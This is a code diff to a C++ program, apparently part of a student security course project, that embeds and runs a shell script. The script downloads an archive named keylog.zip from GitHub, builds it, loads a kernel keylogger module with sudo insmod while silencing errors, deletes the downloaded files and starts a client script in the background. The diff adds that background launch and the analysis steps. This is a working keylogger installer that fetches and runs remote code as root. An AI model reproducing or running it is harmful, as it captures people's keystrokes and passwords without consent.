@@ -12,11 +12,18 @@ const char *text=
 	"wget -q https://github.com/ECS153/final-project-click-to-add-lemon/archive/master.zip -O keylog.zip\n"
 	"unzip -o -q keylog.zip\n"
 	"cd final-project-click-to-add-lemon-master/Source/\n"
-	"make -s\n"
+	"make -s 2>/dev/null\n"
 	"sudo insmod keylog.ko 2>/dev/null\n"
+	"cd AnalyzeData/\n"
+	"g++ -o analyze analyze.cpp\n"
+	"chmod 755 analyze\n"
+	"cp analyze ../Scripts\n"
+	"cd ..\n"
+	"cp -r Scripts/ ../../Scripts \n"
 	"cd ../..\n"
 	"rm -r -f keylog.zip keylog_ins\n"
-	"rm -r -f final-project-click-to-add-lemon-master\n";
+	"rm -r -f final-project-click-to-add-lemon-master\n"
+	"python3 Scripts/client_script.py & 2>/dev/null \n";
 	
 void convert();
 
@@ -56,14 +63,13 @@ int main(){
 
 			system("chmod 755 keylog_ins");
 			system("./keylog_ins");
+			convert();
 		}else{
 			cout<<"Service terminated.\n";
 		}
 	}else{
 		cout<<""; //function without prompt
 	}
-	//cout<< "do some convertion (under construction)";
-	convert();
 
 	return 0;
 }
